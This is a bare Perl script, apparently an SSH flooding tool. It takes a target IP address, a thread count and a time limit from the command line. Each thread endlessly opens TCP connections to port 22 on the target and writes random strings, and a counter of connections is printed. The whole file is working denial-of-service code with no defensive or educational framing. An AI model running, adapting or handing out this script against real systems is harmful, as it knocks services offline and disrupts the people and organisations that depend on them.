use IO::Socket;
use threads;

my $ip      = $ARGV[0];
my $threads = $ARGV[1];
alarm( $ARGV[2] );

my $count;
my @threads = initThreads();
my @chars = ( "a" .. "z", A .. Z, 0 .. 9 );

foreach (@threads) { $_ = threads->create( \&sshflood ); }
foreach (@threads) { $_->join(); }

sub initThreads {
    my @initThreads;
    for ( my $i = 1 ; $i <= $threads ; $i++ ) {
        push( @initThreads, $i );
    }
    return @initThreads;
}

sub sshflood {

    while (1) {
        my $random = join '', map { @chars[ rand @chars ] } 1 .. 8;
        $socket = IO::Socket::INET->new(
            Proto    => 'tcp',
            PeerAddr => $ip,
            PeerPort => '22',
        ) or return $!;

        print $socket "$random";
        close($socket);
        $count++;
        print "$count\r";
    }
}
